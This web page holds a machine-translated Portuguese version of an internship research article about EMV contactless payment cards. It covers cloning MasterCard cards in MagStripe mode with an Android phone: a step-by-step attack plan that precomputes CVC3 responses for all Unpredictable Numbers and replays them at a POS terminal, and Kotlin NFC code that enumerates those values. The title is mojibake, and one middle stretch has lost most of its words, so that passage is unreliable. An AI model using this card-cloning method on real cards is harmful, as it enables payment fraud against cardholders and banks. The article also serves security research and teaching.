<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëáüèº üêâ üîÆ Clonar um cart√£o sem contato usando um aplicativo m√≥vel üëπ üë¨ üñïüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Sempre foi interessante ver o que est√° acontecendo em um cart√£o banc√°rio sob o cap√¥. Como o protocolo de comunica√ß√£o de um cart√£o banc√°rio e um termin...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Clonar um cart√£o sem contato usando um aplicativo m√≥vel</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/421543/">  Sempre foi interessante ver o que est√° acontecendo em um cart√£o banc√°rio sob o cap√¥.  Como o protocolo de comunica√ß√£o de um cart√£o banc√°rio e um terminal POS √© implementado, como funciona e como √© seguro.  Essa oportunidade apareceu diante de mim quando eu estava fazendo um est√°gio na Digital Security.  Como resultado, ao analisar uma vulnerabilidade conhecida de cart√µes EMV no modo MagStripe, decidiu-se implementar um aplicativo m√≥vel capaz de se comunicar com o terminal por meio de uma interface sem contato, usando seus pr√≥prios comandos e uma an√°lise detalhada de solicita√ß√µes e respostas.  E tamb√©m tente implementar o m√©todo de clonagem de cart√µes MasterCard no modo MagStripe. <br><br>  Neste artigo, tentarei descrever o que √© um cart√£o EMV, como ele funciona e como usar o Android, voc√™ pode tentar clonar seu cart√£o MasterCard. <br><br>  <i><b>"H√° algumas coisas que o dinheiro n√£o pode comprar.</b></i>  <i><b>Para todo o resto, h√° MasterCard ¬ª</b></i> <br><br><h3>  O que √© um cart√£o EMV? </h3><br>  EMV √© o padr√£o internacional para cart√µes banc√°rios com chip.  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA participaram do desenvolvimento deste padr√£o, da√≠ o nome.  Vamos tentar descobrir como o cart√£o se comunica com o terminal POS atrav√©s de uma interface sem contato. <br><a name="habracut"></a><br>  Vamos come√ßar com o b√°sico. <br><br>  Um cart√£o EMV f√≠sico sem contato funciona quase da mesma forma que uma etiqueta RFID.  Se for b√°sico, o chip entra no campo eletromagn√©tico e, em um circuito condutor fechado (no nosso caso, ser√° uma antena localizada ao redor do per√≠metro), colocada em um campo magn√©tico alternado, √© gerada uma corrente el√©trica alternada.  Essa corrente carrega um capacitor especial conectado em paralelo ao circuito ressonante da placa.  A energia armazenada no capacitor √© usada para executar um cart√£o de microcircuito para v√°rias opera√ß√µes.  Quando o leitor altera o campo eletromagn√©tico, as altera√ß√µes ser√£o notadas imediatamente no chip.  Usando modula√ß√£o de sinal, podemos transmitir informa√ß√µes em formato bin√°rio.  Se voc√™ conectar a resist√™ncia √† carga no cart√£o e / ou alterar a capacit√¢ncia do capacitor, poder√° alterar a for√ßa da corrente no circuito do cart√£o, o que levar√° a uma altera√ß√£o no campo eletromagn√©tico criado por ele na √°rea do circuito do leitor, para que o cart√£o transmita dados.  O leitor ter√° que detectar essas altera√ß√µes.  Essa intera√ß√£o f√≠sica √© regida pela norma ISO / IEC 14443 <i>"Cart√µes de identifica√ß√£o - cart√µes de circuito (s) integrado (s) sem contato - cart√µes de proximidade"</i> . <br><br>  O chip de cart√£o em si √© um cart√£o inteligente que executa o JavaCard, uma vers√£o separada do Java para plataformas com poucos recursos de computa√ß√£o e suporte para algoritmos criptogr√°ficos.  O JavaCard baixa applets, que s√£o aplicativos.  H√° tamb√©m um GlobalPlatform √© um determinado padr√£o para JavaCard, que fornece a capacidade de gerenciar dados com seguran√ßa no mapa e permite baixar, modificar e excluir aplicativos no mapa.  Neste artigo, n√£o consideraremos os mecanismos de seguran√ßa do pr√≥prio cart√£o inteligente.  Basta saber que os dados protegidos, por exemplo, a chave privada e a chave mestra secreta do cart√£o, est√£o em um local seguro e √© imposs√≠vel remov√™-los usando meios padr√£o. <br><br>  Recordo tamb√©m uma pequena terminologia para aqueles que n√£o est√£o familiarizados. <br><br>  <b>Terminal POS</b> (ponto de venda) - o dispositivo de um vendedor que l√™ um cart√£o e inicia um pagamento.  Al√©m disso, chamaremos este dispositivo simplesmente de terminal. <br>  <b>O banco emissor</b> √© o banco que emitiu seu cart√£o. <br>  <b>Banco Adquirente</b> - um banco que emite terminais POS para vendedores e processa pagamentos deles. <br>  <b>O sistema de pagamento</b> √© o elo central entre o banco adquirente e o banco emissor, absolutamente todos os pagamentos passam por ele e sabe qual banco deve transferir dinheiro para quanto.  Existem muitos sistemas de pagamento no mundo, al√©m dos conhecidos <b>Visa</b> e <b>MasterCard,</b> tamb√©m existem <b>American Express</b> , <b>China UnionPay</b> e o sistema de pagamentos russo <b>MIR</b> . <br><br>  Bem, o cart√£o e o leitor podem se comunicar.  Eles enviam comandos APDU uns aos outros na forma de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Tag-Length-Value,</a> ou seja,  o nome da tag √© transmitido em hexadecimal, seu comprimento e valor pr√≥prio.  Todos os comandos s√£o descritos, √© claro, na <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">documenta√ß√£o</a> e se parecem com isso: <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="imagem"><br><br>  A transa√ß√£o EMV padr√£o ocorre em v√°rias etapas; descreverei o algoritmo de intera√ß√£o completo no caso de uma interface de contato; para uma interface sem contato, o algoritmo √© um pouco reduzido: <br><br><ul><li>  Sele√ß√£o de aplicativos; </li><li>  Inicializa√ß√£o do processamento de aplicativos; </li><li>  Lendo dados do aplicativo </li><li>  Autentica√ß√£o offline </li><li>  Restri√ß√µes de processamento; </li><li>  Cheque do titular do cart√£o; </li><li>  Gerenciamento de riscos na lateral do terminal; </li><li>  An√°lise de a√ß√µes terminais; </li><li>  Gerenciamento de riscos no lado do cart√£o; </li><li>  An√°lise das a√ß√µes do cart√£o; </li><li>  Processamento on-line; </li><li>  A conclus√£o da opera√ß√£o. </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="imagem"><br><br>  Consideramos brevemente cada opera√ß√£o. <br><br>  Sele√ß√£o de aplicativos.  Muitas vezes, pode haver v√°rios aplicativos em um cart√£o.  Por exemplo, um cart√£o banc√°rio e uma passagem de viagem.  E o terminal de alguma forma precisa descobrir onde e qual algoritmo usar.  O chamado <b>Application Identifier (AID</b> ) √© usado para selecionar um aplicativo.  Para entender isso, o terminal envia um comando <b>SELECT</b> .  Por exemplo, o <b>AID</b> do cart√£o Visa Classic ter√° a seguinte apar√™ncia: <b>A0000000031010</b> .  Se v√°rios desses c√≥digos responderem e o terminal puder funcionar com v√°rias aplica√ß√µes, o terminal exibir√° uma lista e oferecer√° a sele√ß√£o da aplica√ß√£o necess√°ria.  Se o terminal n√£o suportar nenhum c√≥digo de aplica√ß√£o, a opera√ß√£o ser√° rejeitada pelo terminal. <br><br>  Inicializando o processamento do aplicativo.  Aqui, a localiza√ß√£o geogr√°fica √© verificada primeiro.  Por exemplo, os cart√µes Maestro Momentum podem funcionar apenas para pagamento na R√∫ssia.  Esse est√°gio √© realizado para fornecer aos emissores a oportunidade de aplicar os m√©todos de gerenciamento de risco online existentes ao realizar opera√ß√µes offline.  Nesse est√°gio, uma transa√ß√£o EMV pode ser cancelada por iniciativa do pr√≥prio cart√£o, se esse tipo de transa√ß√£o for proibido pelo emissor em um determinado pa√≠s do mundo.  Al√©m disso, o cart√£o transmite ao terminal um conjunto de informa√ß√µes especialmente estruturadas, contendo uma descri√ß√£o da funcionalidade do cart√£o e do aplicativo. <br><br>  Leia os dados do aplicativo.  V√°rios dados do cart√£o necess√°rios para a transa√ß√£o s√£o transmitidos ao terminal, por exemplo, n√∫mero do cart√£o, data de validade, contador de transa√ß√µes e muitos outros dados.  Alguns deles ser√£o discutidos mais tarde. <br><br>  Dados de exemplo: <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="imagem"><br><br>  Um certificado da chave p√∫blica do banco emissor e do pr√≥prio cart√£o tamb√©m √© transmitido.  Para que o terminal possa verificar a assinatura digital de alguns dados do cart√£o, √© usada a <b>infraestrutura PKI</b> (Public Key Infrastructure).  Em resumo, o sistema de pagamento possui um par de chaves - p√∫blicas e privadas, e o sistema de pagamento √© para todos os participantes da <b>CA (Autoridade Central)</b> .  De fato, o sistema de pagamento de cada banco do emissor emite um novo par de chaves e, ao mesmo tempo, gera um certificado da chave p√∫blica do banco do emissor, assinando-o com a chave privada CA.  Al√©m disso, quando o banco emite um novo cart√£o, gera um par de chaves para o cart√£o e tamb√©m gera um certificado da chave p√∫blica do cart√£o, assinando-o usando a chave privada do banco.  Nos terminais, um certificado de chave p√∫blica √© normalmente conectado a v√°rios sistemas de pagamento.  Assim, quando o cart√£o transmite o certificado de chave p√∫blica do banco do emissor e o pr√≥prio certificado do cart√£o, o terminal pode verificar facilmente toda a cadeia usando a chave p√∫blica do sistema de pagamento.  O terminal, usando a chave p√∫blica do sistema de pagamento, primeiro verifica a autenticidade do certificado banc√°rio do emissor, se for genu√≠no, ent√£o pode ser confi√°vel e agora, usando o certificado banc√°rio do emissor, voc√™ pode verificar o certificado do pr√≥prio cart√£o.  Mais detalhes no artigo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">sobre seguran√ßa EMV</a> . <br><br>  Autentica√ß√£o offline.  O terminal determina o tipo de m√©todo de autentica√ß√£o offline suportado.  H√° est√°tico ( <b>Autentica√ß√£o de Dados Est√°ticos - SDA</b> ), din√¢mico ( <b>Autentica√ß√£o de Dados Din√¢micos - DDA</b> ) e combinado ( <b>Autentica√ß√£o de Dados Combinados - CDA</b> ).  Esses m√©todos tamb√©m s√£o baseados na PKI.  <b>O SDA</b> √© apenas um dado assinado na chave privada do banco do emissor, <b>DDA</b> - o terminal envia um n√∫mero aleat√≥rio e o cart√£o deve assin√°-lo usando sua chave privada, e o terminal verificar√° essa assinatura usando o certificado de cart√£o recebido anteriormente, para que o terminal verifique se o cart√£o realmente tem uma chave privada - portanto, √© genu√≠no.  <b>CDA</b> √© apenas uma combina√ß√£o de ambos. <br><br>  Restri√ß√µes de manuseio.  Aqui, o terminal verifica os dados recebidos anteriormente do cart√£o quanto √† condi√ß√£o de adequa√ß√£o para esta opera√ß√£o.  Por exemplo, ele verifica as datas de in√≠cio / t√©rmino da <b>Data de vencimento do aplicativo (Tag '5F24')</b> e <b>Data efetiva do aplicativo (Tag '5F25')</b> .  Ele tamb√©m verifica a vers√£o do aplicativo.  Os resultados das opera√ß√µes realizadas nesta fase tamb√©m s√£o registrados no relat√≥rio <b>TVR (resultados da verifica√ß√£o do terminal)</b> .  Com base nos resultados desse est√°gio, a transa√ß√£o n√£o pode ser cancelada, mesmo que, por exemplo, o aplicativo tenha expirado. <br><br>  Cheque do titular do cart√£o.  A verifica√ß√£o do titular do cart√£o √© realizada para autenticar a pessoa que forneceu o cart√£o e verificar se ele √© o verdadeiro propriet√°rio do cart√£o.  O padr√£o EMV fornece v√°rios <b>m√©todos de verifica√ß√£o do titular do cart√£o</b> .  Os m√©todos de verifica√ß√£o s√£o definidos no terminal e no mapa.  Eles est√£o contidos nas chamadas <b>listas CVM</b> .  No processo de execu√ß√£o, o terminal e o cart√£o comparam as listas CVM recebidas e selecionam o m√©todo de verifica√ß√£o geral. <br><br>  Lista de m√©todos de verifica√ß√£o suportados: <br><br><ul><li>  N√£o √© necess√°ria CVM ('011111'b); </li><li>  Falha no processamento do CVM ('000000'b); </li><li>  Assinatura ('011110'b); </li><li>  PIN codificado verificado on-line ('000010'b); </li><li>  Verifica√ß√£o de PIN de texto sem formata√ß√£o realizada pela ICC ('000001'b); </li><li>  Verifica√ß√£o de PIN de texto sem formata√ß√£o realizada pela ICC e assinatura ('000011'b); </li><li>  Verifica√ß√£o de PIN codificado realizada pela ICC ('000100'b); </li><li>  Verifica√ß√£o do PIN codificado realizada pela ICC e assinatura ('000101'b). </li></ul><br>  Aqui tamb√©m <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">h√°</a> informa√ß√µes interessantes sobre esse assunto. <br><br>  Gerenciamento de riscos na lateral do terminal.  Nesta fase, o terminal realiza uma verifica√ß√£o interna dos par√¢metros da transa√ß√£o, com base nas configura√ß√µes de gerenciamento de risco do banco adquirente.  Os procedimentos de gerenciamento de riscos podem ser executados pelo terminal a qualquer momento entre a conclus√£o do processo de leitura dos dados do cart√£o e a forma√ß√£o do primeiro comando <b>GENERATE AC</b> pelo terminal.  O gerenciamento de riscos no lado do terminal inclui tr√™s mecanismos: <br><br><ul><li>  controle do tamanho das opera√ß√µes realizadas no cart√£o ( <b>verifica√ß√£o de limite de piso</b> ); </li><li>  sele√ß√£o de transa√ß√£o aleat√≥ria para autoriza√ß√£o on-line desta transa√ß√£o pelo emissor ( <b>Sele√ß√£o de transa√ß√£o aleat√≥ria</b> ); </li><li>  verifica√ß√£o da atividade offline do uso do cart√£o ( <b>verifica√ß√£o de velocidade</b> ). </li></ul><br>  An√°lise de a√ß√µes terminais.  Nesta fase, o terminal analisa os resultados das etapas anteriores da transa√ß√£o.  Com base nos resultados da an√°lise, o terminal decide se deve realizar a opera√ß√£o on-line, permitir que ela seja executada off-line ou rejeitar a opera√ß√£o. <br><br>  Gerenciamento de riscos no lado do cart√£o.  O cart√£o, tendo recebido do comando <b>GENERATE AC</b> dados sobre a transa√ß√£o, o terminal e os resultados das verifica√ß√µes do terminal, por sua vez, executa seus pr√≥prios procedimentos de gerenciamento de riscos e toma sua pr√≥pria decis√£o sobre como concluir a opera√ß√£o. <br><br>  An√°lise das a√ß√µes do cart√£o.  Nesse est√°gio, o cart√£o conclui os procedimentos de gerenciamento de riscos e gera um criptograma de resposta no terminal.  Se o cart√£o decidir aprovar a transa√ß√£o, um <b>certificado de transa√ß√£o</b> ser√° gerado.  Se o cart√£o decidir executar a opera√ß√£o em tempo real, ele gera um <b>ARQC (Cryptograma de solicita√ß√£o de autoriza√ß√£o)</b> .  Se o cart√£o usar m√©todos de autoriza√ß√£o alternativos, <b>ser√° usada a refer√™ncia de autoriza√ß√£o</b> do <b>aplicativo</b> .  Caso o cart√£o rejeite a transa√ß√£o, o <b>criptograma de autentica√ß√£o do aplicativo</b> . <br><br>  √â necess√°rio outro <b>criptograma do ARPC (Authorization Response Cryptoggram)</b> para autenticar o emissor.  O emissor gera um ARPC do criptograma e envia o criptograma para o cart√£o; se o cart√£o confirma o criptograma, o emissor √© autenticado pelo cart√£o. <br><br>  Um pouco sobre a seguran√ßa das chaves e a autentica√ß√£o m√∫tua do cart√£o e do emissor do livro de I. M. Goldovsky: <blockquote>  O significado da autentica√ß√£o m√∫tua √© que o cart√£o e o terminal se autenticam usando a autentica√ß√£o dos criptogramas ARQC e ARPC.  Criptogramas s√£o dados gerados usando uma chave secreta (que √© conhecida pelo cart√£o e pelo banco ao emissor), n√∫mero da transa√ß√£o, n√∫mero aleat√≥rio gerado pelo terminal, al√©m de alguns detalhes da transa√ß√£o, terminal e cart√£o.  No caso do ARPC, o c√≥digo de resposta da autoriza√ß√£o do emissor tamb√©m √© adicionado aos dados listados.  Sem conhecer a chave secreta do cart√£o para gerar um criptograma, √© imposs√≠vel calcular os valores ARQC / ARPC no tempo previs√≠vel com o n√≠vel atual de tecnologia e, portanto, o fato de sua verifica√ß√£o bem-sucedida indica a autenticidade do cart√£o e do emissor.  A autentica√ß√£o online √© a maneira mais confi√°vel de autenticar um cart√£o.  Isso se deve ao fato de ser realizado diretamente pelo emissor, sem intermedi√°rio na forma de terminal.  Al√©m disso, o algoritmo 3DES com uma chave tempor√°ria de 112 bits √© usado para autentica√ß√£o online, cuja for√ßa criptogr√°fica corresponde √† for√ßa criptogr√°fica do algoritmo RSA com o comprimento do m√≥dulo de chave assim√©trica usado para autentica√ß√£o offline do aplicativo de cart√£o que excede 1700 bits.  O uso de chaves assim√©tricas desse tamanho no cart√£o ainda √© bastante raro.  Normalmente, chaves com um comprimento de m√≥dulo de 1024, 1152 ou 1408 bits s√£o usadas. </blockquote><br><br>  Por fim, uma transa√ß√£o online passa por uma cadeia: <br>  <b>Cart√£o &lt;--&gt; POS-Terminal &lt;--&gt; Banco Adquirir &lt;--&gt; Sistema de Pagamento &lt;--&gt; Emissor do Banco.</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="imagem"><br><br><h3>  Clone MasterCard no modo MagStripe </h3><br>  Prosseguimos diretamente com o princ√≠pio da clonagem.  Este m√©todo de ataque por cart√£o sem contato foi publicado por dois pesquisadores <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Michael Roland, Josef Langer,</a> da Universidade da √Åustria.  √â baseado em um princ√≠pio geral chamado <i>Skimming</i> .  Esse √© um cen√°rio no qual um invasor rouba dinheiro de um cart√£o banc√°rio lendo (copiando) as informa√ß√µes desse cart√£o.  No caso geral, √© importante manter o PIN em segredo e n√£o vaz√°-lo.  Mas, no m√©todo dos austr√≠acos, n√£o precisamos saber disso.  A clonagem de um cart√£o de pagamento √© bem-sucedida na vers√£o do kernel do aplicativo EMV Contactless Kernel 2. A vers√£o deste protocolo suporta dois modos de opera√ß√£o para cart√µes sem contato: o protocolo EMV <b>(MasterCard PayPass M / Chip)</b> e o modo <b>MagStripe (MasterCard PayPass MagStripe)</b> . <br><br>  <b>MagStripe</b> √© um modo de suporte de cart√£o de tarja magn√©tica.  Este modo √© implementado em cart√µes MasterCard com uma interface sem contato.  O modo MagStripe √© provavelmente necess√°rio para bancos que acham dif√≠cil transferir toda a infraestrutura para suportar transa√ß√µes EMV sem contato com chip.  A prop√≥sito, os cart√µes Visa tamb√©m t√™m um modo de opera√ß√£o semelhante - <b>PayWave MSD (Magnetic Stripe Data)</b> . <br><br>  O processo de processamento de transa√ß√µes para cart√µes sem contato √© truncado em compara√ß√£o com cart√µes com chip e geralmente funciona no seguinte modo: <br><br><ol><li>  O terminal envia um <b>comando SELECT PPSE</b> (Proximity Payment System Environment).  O cart√£o envia uma lista de aplicativos suportados. </li><li>  O terminal envia um comando <b>SELECT</b> .  Em resposta, ele recebe os detalhes necess√°rios do aplicativo. </li><li>  O terminal envia o comando <b>GET_PROCESSING_OPTIONS</b> .  O cart√£o responde que tipo de autentica√ß√£o ele suporta e se a verifica√ß√£o do titular do cart√£o existe l√°. </li><li>  O terminal envia o comando <b>READ_RECORDS</b> .  O cart√£o em resposta envia o Track1 e o Track2 quase os mesmos que os registrados na tira magn√©tica do cart√£o. </li><li>  O terminal envia o comando <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .  O que significa que o cart√£o deve gerar um valor CVC3 com base no n√∫mero imprevis√≠vel passado. </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="imagem"><br><br><div class="spoiler">  <b class="spoiler_title">Como tudo parece na vida real?</b> <div class="spoiler_text">  Parece uma equipe da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">APDU</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Lista de todas as tags</a> . <br><br>  APDU - Application Protocol Data Unit √© um s√≠mbolo de um quadro com um comando de mapa ou resposta de mapa. <br><br>  Existem alguns artigos sobre esse t√≥pico <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br></div></div><br>  O cart√£o suporta o comando especial COMPUTE CRYPTOGRAPHIC CHECKSUM, cujo argumento s√£o os dados definidos no UDOL (Unpredictable Number Data Object).  <b>Como resultado, o cart√£o que utiliza o algoritmo 3DES e a chave secreta calcula o valor din√¢mico CVC3 (C√≥digo de verifica√ß√£o do cart√£o).</b>  Como argumento para a fun√ß√£o 3DES, a concatena√ß√£o dos dados UDOL e o contador de transa√ß√µes (Application Transaction Counter, ATC) s√£o usados.  <b>Assim, o valor do CVC3 sempre depende dos objetos UN e ATC.</b> <br><br>  Em outras palavras, esse comando √© necess√°rio para que o cart√£o gere uma certa ‚Äúassinatura‚Äù para que o emissor possa verificar o cart√£o.  No entanto, a assinatura da transa√ß√£o em si est√° ausente nessa assinatura.  A assinatura cont√©m valores <b>ATC - 2 bytes</b> , <b>CVC3 (Faixa1) - 2 bytes</b> , <b>CVC3 (Faixa2) - 2 bytes</b> , que s√£o gerados pelo cart√£o com base na chave secreta, que o banco emissor e o contador de transa√ß√µes (ATC) tamb√©m conhecem.  Ao mesmo tempo, para gerar a assinatura, o terminal POS informa o cart√£o <b>ONU (n√∫mero imprevis√≠vel)</b> - 4 bytes, que tamb√©m √© usado na gera√ß√£o da assinatura.  N√∫mero imprevis√≠vel impede a gera√ß√£o de c√≥digos de autentica√ß√£o em um cart√£o real para uso posterior em transa√ß√µes fraudulentas.  Para o ataque, a ONU interfere fortemente conosco, pois n√£o √© poss√≠vel enumerar 4 bytes sem ir al√©m dos limites do contador de transa√ß√µes.  No entanto, existem algumas fraquezas na especifica√ß√£o disso. <br><br>  Em primeiro lugar, a especifica√ß√£o restringe a ONU √† codifica√ß√£o de n√∫meros, ou seja, o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">C√≥digo Decimal Bin√°rio (BCD)</a> , o que significa essencialmente que, se observarmos um n√∫mero codificado em HEX, veremos apenas n√∫meros de 0 a 9, todos os outros valores ser√£o considerados. como se proibido.  Assim, a quantidade de ONU diminui de 4.294.967.295 para 99.999.999. <br><br>  Em segundo lugar, o n√∫mero de d√≠gitos significativos da ONU √© determinado pelo cart√£o.  Assim, dependendo dos par√¢metros especiais nas faixas, o n√∫mero de d√≠gitos na ONU pode ser de 10 a 10000, dependendo do tipo de cart√£o, na pr√°tica, na maioria dos casos, s√£o encontrados 1000 valores. <br><br>  <b>Assim, o plano de ataque √© o seguinte:</b> <br><br><ol><li>  Lemos o cart√£o e descobrimos o n√∫mero de d√≠gitos significativos da ONU, que o terminal fornecer√° </li><li>  Classificamos todas as UNs, obtemos todos os valores poss√≠veis da fun√ß√£o <b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b> e os salvamos na tabela correspondente com o mapeamento UN -&gt; Result </li><li>  N√≥s o levamos ao terminal do PDV, descobrimos o n√∫mero que o terminal do PDV solicita. </li><li>  Selecionamos o resultado desejado da tabela e o substitu√≠mos em resposta ao terminal. </li><li>  A transa√ß√£o est√° saindo. </li><li>  LUCRO.  Mas o sucesso da aprova√ß√£o da transa√ß√£o n√£o √© garantido, porque o banco emissor pode rejeitar essa transa√ß√£o. </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="imagem"><br><br>  Tamb√©m √© importante notar que o contador de transa√ß√µes (ATC) impede a reutiliza√ß√£o de c√≥digos de autentica√ß√£o usados ‚Äã‚Äãanteriormente, o que significa que, se usamos esse ataque, devemos copiar o cart√£o novamente, pois o contador de transa√ß√µes j√° foi usado para obter informa√ß√µes e foi usado na assinatura, o que significa se tiv√©ssemos um contador de transa√ß√µes de 1.000 e depois de enviarmos a transa√ß√£o ao banco, o banco n√£o aceitar√° mais transa√ß√µes com um contador abaixo de &lt;1001.  ,    2 ,  ,       65   ,       . <br><br>           . ,  <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .    CVC3 ,       <b>SELECT</b> ,  <b>GET_PROCESSING_OPTIONS</b> ,    <b>COMPUTE_CRYPTOGRACHIC_CHECKSUM</b>     .       CVC3.         , <b> 1000   Google Galaxy Nexus S    .</b> <br><br>         <b>Terminal Simulator</b>  MasterCard.      NFC-    .      .        POS-           .         ,    . <br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="imagem"><br><br>     NFC  <b>ACR122</b> . <br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="imagem"><br><br>        .      Kotlin  Android.      . <br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br>  Primeiro, precisamos configurar o trabalho com NFC.  No telefone, podemos trabalhar em dois modos.  No modo cart√£o, √© quando respondemos aos comandos do terminal e no modo terminal, quando enviamos comandos e lemos, por exemplo, um cart√£o.  I.e.  primeiro, podemos clonar o cart√£o e, em seguida, garantir que respondamos √†s solicita√ß√µes do terminal com comandos j√° preparados. <br><br>  A seguir, uma implementa√ß√£o simplificada da intera√ß√£o com a NFC: <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br>  Isso descreve a sequ√™ncia de comandos e enumera os valores de N√∫mero imprevis√≠vel em um ciclo de 0 a 999, alteramos Nc para ‚Äú00000 $ {String.format ("% 03d ", i)}". Substitua (".. (?! $ ) ". toRegex ()," $ 0 ").  E n√£o esque√ßa de executar GET_PROCESSING_OPTIONS todas as vezes antes de COMPUTE_CRYPTOGRAPHIC_CHECKSUM, caso contr√°rio, o valor do cheque n√£o ser√° calculado. 